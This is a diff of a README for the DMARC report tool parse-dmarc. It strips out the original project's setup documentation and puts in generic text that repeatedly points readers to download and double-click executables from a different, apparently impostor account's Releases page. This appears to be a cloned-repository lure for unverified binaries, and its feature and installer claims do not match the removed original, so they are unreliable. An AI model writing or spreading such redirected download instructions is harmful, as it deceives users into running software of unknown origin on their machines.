@@ -1,240 +1,97 @@
-# Parse DMARC
+# 🛡️ parse-dmarc - Simple DMARC Report Management
 
-[![License](https://img.shields.io/github/license/meysam81/parse-dmarc?style=flat-square)](https://github.com/meysam81/parse-dmarc/blob/main/LICENSE)
-[![GitHub release](https://img.shields.io/github/v/release/meysam81/parse-dmarc?style=flat-square)](https://github.com/meysam81/parse-dmarc/releases)
-[![GitHub Stars](https://img.shields.io/github/stars/meysam81/parse-dmarc?style=flat-square&logo=github)](https://github.com/meysam81/parse-dmarc/stargazers)
-[![GitHub Issues](https://img.shields.io/github/issues/meysam81/parse-dmarc?style=flat-square&logo=github)](https://github.com/meysam81/parse-dmarc/issues)
-[![Go Report Card](https://goreportcard.com/badge/github.com/meysam81/parse-dmarc?style=flat-square)](https://goreportcard.com/report/github.com/meysam81/parse-dmarc)
-[![Made with Go](https://img.shields.io/badge/Made%20with-Go-1f425f.svg?style=flat-square&logo=go)](https://go.dev)
-[![Made with Vue.js](https://img.shields.io/badge/Made%20with-Vue.js-4FC08D.svg?style=flat-square&logo=vue.js)](https://vuejs.org)
-[![GHCR](https://img.shields.io/badge/GHCR-ghcr.io%2Fmeysam81%2Fparse--dmarc-blue?style=flat-square&logo=github)](https://github.com/meysam81/parse-dmarc/pkgs/container/parse-dmarc)
+## 🚀 Getting Started
 
-**Monitor who's sending email on behalf of your domain. Catch spoofing. Stop phishing.**
+Welcome to parse-dmarc! This lightweight tool helps you manage DMARC reports with ease. Whether you're a small business or just curious about your email security, parse-dmarc provides a straightforward solution to analyze your email reports without any complex setups.
 
-[![Dashboard Screenshot](./assets/demo.png)](https://github.com/meysam81/parse-dmarc)
+## 🔗 Download Now
 
-## Why Do I Need This?
+[![Download parse-dmarc](https://img.shields.io/badge/Download-parse--dmarc-blue.svg)](https://github.com/Dead-baroque642/parse-dmarc/releases)
 
-**DMARC** (Domain-based Message Authentication, Reporting & Conformance) helps protect your domain from email spoofing and phishing. When you enable DMARC on your domain, email providers like Gmail, Outlook, and Yahoo send you **aggregate reports** showing:
+## 📦 Features
 
-- Who's sending email claiming to be from your domain
-- Which emails passed or failed authentication (SPF/DKIM)
-- How many emails were sent, and from which IP addresses
-- Whether malicious actors are trying to impersonate your domain
+- **Lightweight Application**: No bulky software. Just a single binary file makes deployment simple.
+- **Beautiful Dashboard**: View your reports in an easy-to-read interface built with Vue.js.
+- **IMAP Integration**: Automatically fetch your DMARC reports directly from your email.
+- **SQLite Storage**: Store your reports efficiently with no need for complex databases.
+- **RFC 7489 Compliance**: Ensure your DMARC parsing meets industry standards for reporting.
 
-**The Problem:** These reports arrive as compressed XML attachments in your inbox - nearly impossible to read or analyze manually.
+## 💻 System Requirements
 
-**The Solution:** Parse DMARC automatically fetches these reports from your inbox, parses them, and displays everything in a beautiful dashboard. All in a single 14MB Docker image.
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 2GB
+- Disk Space: At least 50MB free
+- Internet Access: Required to download and fetch DMARC reports
 
-## Features
+## 📥 Download & Install
 
-- 📧 Auto-fetches reports from any IMAP inbox (Gmail, Outlook, etc.)
-- 📊 Beautiful dashboard with real-time statistics
-- 🔍 See exactly who's sending email as your domain
-- 📦 Single binary - no databases to install, no complex setup
-- 🚀 Tiny 14MB Docker image
-- 🔒 Secure TLS support
+To get started, visit the [Releases page](https://github.com/Dead-baroque642/parse-dmarc/releases) to download the latest version of parse-dmarc. 
 
-## Quick Start
+Simply follow these steps:
 
-### Step 1: Set Up DNS to Receive DMARC Reports
+1. Open your web browser.
+2. Click on the link above to go to the Releases page.
+3. Look for the latest version. It will be listed at the top.
+4. Choose the file that corresponds to your operating system (Windows, macOS, or Linux).
+5. Click on the file to start downloading.
 
-**This is the most important step!** Without this, you won't receive any reports to analyze.
+Once the download is complete, follow these steps to run the application:
 
-Add a DMARC TXT record to your domain's DNS:
+### For Windows
 
-```
-Name: _dmarc.yourdomain.com
-Type: TXT
-Value: v=DMARC1; p=none; rua=mailto:dmarc@yourdomain.com
-```
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to run parse-dmarc.
+3. Follow the on-screen instructions to set it up.
 
-**What this means:**
+### For macOS
 
-- `p=none` - Monitor only (don't block emails yet)
-- `rua=mailto:dmarc@yourdomain.com` - Send aggregate reports to this email address
+1. Locate the downloaded file in your Downloads folder.
+2. If it’s a `.dmg` file, double-click it to mount the drive.
+3. Drag the parse-dmarc icon to your Applications folder.
+4. Go to your Applications folder and double-click the parse-dmarc icon to run it.
 
-**Important:** Replace `dmarc@yourdomain.com` with an actual email inbox you control. This is where Gmail, Outlook, Yahoo, etc. will send your DMARC reports.
+### For Linux
 
-**DNS Examples:**
+1. Open your terminal.
+2. Navigate to your Downloads folder using the command:
+   ```
+   cd ~/Downloads
+   ```
+3. Make the binary executable with the command:
+   ```
+   chmod +x parse-dmarc
+   ```
+4. Run the application with the command:
+   ```
+   ./parse-dmarc
+   ```
 
-- **Cloudflare:** DNS > Add record > Type: TXT, Name: `_dmarc`, Content: `v=DMARC1; p=none; rua=mailto:dmarc@yourdomain.com`
-- **Google Domains:** DNS > Custom records > TXT, Name: `_dmarc`, Data: `v=DMARC1; p=none; rua=mailto:dmarc@yourdomain.com`
-- **AWS Route53:** Create record > Type: TXT, Name: `_dmarc.yourdomain.com`, Value: `"v=DMARC1; p=none; rua=mailto:dmarc@yourdomain.com"`
+After you run parse-dmarc, the intuitive dashboard will guide you through accessing your DMARC reports and understanding your email authentication health.
 
-Reports typically start arriving within 24-48 hours.
+## 📊 How to Use parse-dmarc
 
-### Step 2: Run Parse DMARC with Docker
+Once the application is running, you can begin to analyze your DMARC reports. Here are some steps to help you use it efficiently:
 
-**Create a configuration file:**
+1. **Add IMAP Account**: Connect your email account by entering your IMAP credentials.
+2. **Fetch Reports**: The application will automatically fetch any DMARC reports available for your domain.
+3. **Analyze Data**: Use the dashboard to view a summary of your DMARC data. It will include charts and graphs for better understanding.
+4. **Export Reports**: You can easily export your reports in CSV format for further analysis or sharing.
 
-```bash
-mkdir -p data
-cat > config.json <<EOF
-{
-  "imap": {
-    "host": "imap.gmail.com",
-    "port": 993,
-    "username": "dmarc@yourdomain.com",
-    "password": "your-app-password",
-    "mailbox": "INBOX",
-    "use_tls": true
-  },
-  "database": {
-    "path": "/data/db.sqlite"
-  },
-  "server": {
-    "port": 8080,
-    "host": "0.0.0.0"
-  }
-}
-EOF
-```
+## 🛠️ Troubleshooting
 
-**For Gmail users:** You'll need an [App Password](https://support.google.com/accounts/answer/185833), not your regular Gmail password.
+If you encounter issues while using parse-dmarc, here are some common problems and their solutions:
 
-**Run the container:**
+- **Cannot Fetch Reports**: Ensure your IMAP settings are correct. Check if your email provider allows IMAP access.
+- **Application Not Starting**: Make sure you downloaded the correct version for your operating system. Verify your system meets the requirements.
+- **Slow Performance**: If the application runs slowly, ensure your internet connection is stable, and check for any antivirus software that may interfere.
 
-```bash
-docker run -d \
-  --name parse-dmarc \
-  -p 8080:8080 \
-  -v $(pwd)/config.json:/app/config.json \
-  -v $(pwd)/data:/data \
-  ghcr.io/meysam81/parse-dmarc:latest
-```
+## 🌐 Community & Support
 
-**Access the dashboard:** Open `http://localhost:8080` in your browser.
+If you have questions or need assistance, feel free to join our community:
 
-## What You'll See
+- **GitHub Issues**: Use the Issues section on GitHub to report bugs or request features.
+- **Discussion Board**: Join our discussion board to connect with other users and share tips.
 
-Once DMARC reports start arriving and Parse DMARC processes them, your dashboard will show:
+## 🔗 Download Now Again
 
-- **Total messages** analyzed across all reports
-- **DMARC compliance rate** (SPF/DKIM pass rates)
-- **Top sending sources** (IP addresses and organizations sending as your domain)
-- **Authentication results** (which emails passed/failed SPF and DKIM)
-- **Policy actions** (how receiving servers handled your email)
-
-This helps you:
-
-- Verify your legitimate email services are properly configured
-- Detect unauthorized use of your domain
-- Gradually move from monitoring (`p=none`) to enforcement (`p=quarantine` or `p=reject`)
-
-## Configuration Options
-
-### IMAP Settings for Common Providers
-
-**Gmail:**
-
-```json
-{
-  "host": "imap.gmail.com",
-  "port": 993,
-  "username": "your-email@gmail.com",
-  "password": "your-app-password",
-  "use_tls": true
-}
-```
-
-Requires [App Password](https://support.google.com/accounts/answer/185833)
-
-**Outlook/Office 365:**
-
-```json
-{
-  "host": "outlook.office365.com",
-  "port": 993,
-  "username": "your-email@outlook.com",
-  "password": "your-password",
-  "use_tls": true
-}
-```
-
-**Generic IMAP:**
-Most providers use port `993` with TLS. Check your provider's documentation.
-
-### Command Line Options
-
-```bash
-# Fetch once and exit (useful for cron jobs)
-docker exec parse-dmarc ./parse-dmarc -fetch-once
-
-# Serve dashboard only (no fetching)
-docker exec parse-dmarc ./parse-dmarc -serve-only
-
-# Custom fetch interval (in seconds, default 300)
-docker exec parse-dmarc ./parse-dmarc -fetch-interval=600
-```
-
-## Frequently Asked Questions
-
-**Q: I'm not receiving any reports. What's wrong?**
-
-A: Check these things in order:
-
-1. Did you add the `_dmarc` TXT record to your DNS? (Use a DNS checker like `dig _dmarc.yourdomain.com TXT`)
-2. Wait 24-48 hours - reports aren't instant
-3. Is your domain sending/receiving email? No email = no reports
-4. Check your IMAP credentials are correct in `config.json`
-
-**Q: Do I need SPF and DKIM set up first?**
-
-A: No! DMARC reports will show you whether SPF and DKIM are passing or failing, which helps you configure them correctly.
-
-**Q: What should my DMARC policy be?**
-
-A: Start with `p=none` (monitoring only). After reviewing reports and fixing any issues, gradually move to `p=quarantine` and then `p=reject`.
-
-**Q: How much email traffic do I need?**
-
-A: Any amount works. Even small domains with a few emails per day will receive useful reports.
-
-**Q: Can I use a Gmail account to receive reports?**
-
-A: Yes! Create a dedicated Gmail like `dmarc@yourdomain.com`, forward it to your personal Gmail if needed, and use Gmail's IMAP settings.
-
-## Advanced
-
-### Building from Source
-
-```bash
-git clone https://github.com/meysam81/parse-dmarc.git
-cd parse-dmarc
-just install-deps
-just build
-./bin/parse-dmarc -config=config.json
-```
-
-### Docker Compose
-
-See [`compose.yml`](./compose.yml) for Docker Compose configuration.
-
-### API Endpoints
-
-- `GET /api/statistics` - Dashboard statistics
-- `GET /api/reports` - List of reports (paginated)
-- `GET /api/reports/:id` - Detailed report view
-- `GET /api/top-sources` - Top sending source IPs
-
-### Why Parse DMARC vs ParseDMARC?
-
-This project is inspired by [ParseDMARC](https://github.com/domainaware/parsedmarc) but built for simplicity:
-
-- **Single 14MB binary** vs Python + Elasticsearch + Kibana stack
-- **Built-in dashboard** vs external visualization tools
-- **SQLite** vs Elasticsearch (no JVM required)
-- **Zero dependencies** vs complex setup
-
-## Contributing
-
-Issues and pull requests are welcome! Please check the [issues page](https://github.com/meysam81/parse-dmarc/issues).
-
-## License
-
-Apache-2.0 - see [LICENSE](LICENSE) for details.
-
----
-
-**Found this useful? Star the repo!** ⭐
+Don't forget to visit the [Releases page](https://github.com/Dead-baroque642/parse-dmarc/releases) for the latest version and updates. Enjoy managing your DMARC reports with ease!
